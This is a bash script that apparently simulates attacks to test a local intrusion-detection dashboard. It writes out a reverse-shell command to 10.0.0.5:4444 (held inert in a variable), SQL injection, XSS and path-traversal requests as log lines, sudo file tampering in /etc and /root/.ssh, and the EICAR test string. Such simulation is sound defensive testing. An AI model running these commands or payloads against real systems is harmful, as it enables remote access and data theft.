#!/usr/bin/env bash
# BRAHMASTRA — safe attack simulation (everything here is inert)
set -u
ROOT="$HOME/brahmastra"
TESTLOG="$ROOT/test_access.log"
echo "[*] Brahmastra simulation starting — watch http://127.0.0.1:5000"
touch "$TESTLOG"

echo "[1] Reverse-shell process pattern (auto-response should KILL it)..."
setsid bash -c 'X="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"; sleep 8' >/dev/null 2>&1 &
sleep 4

echo "[2] Recon tool pattern (nmap)..."
setsid bash -c 'echo nmap -sS 10.10.10.0/24 >/dev/null; sleep 6' >/dev/null 2>&1 &
sleep 4

echo "[3] File tampering in /etc..."
sudo touch /etc/brahmastra_marker; sleep 2; sudo rm -f /etc/brahmastra_marker
sleep 2

echo "[4] SSH key tampering in /root/.ssh..."
sudo mkdir -p /root/.ssh
sudo touch /root/.ssh/brahmastra_key; sleep 2; sudo rm -f /root/.ssh/brahmastra_key
sleep 2

echo "[5] Web attacks (SQLi, XSS, path traversal)..."
echo '203.0.113.7 - - "GET /item?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200' >> "$TESTLOG"
sleep 2
echo '203.0.113.9 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200' >> "$TESTLOG"
sleep 2
echo '203.0.113.9 - - "GET /dl?file=../../../../etc/passwd HTTP/1.1" 200' >> "$TESTLOG"
sleep 2

echo "[6] Malware: dropping EICAR test file in /tmp (harmless, industry-standard)..."
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/brahmastra_eicar.com

echo "[*] Done. Malware scan runs every ~9s — give it a moment."
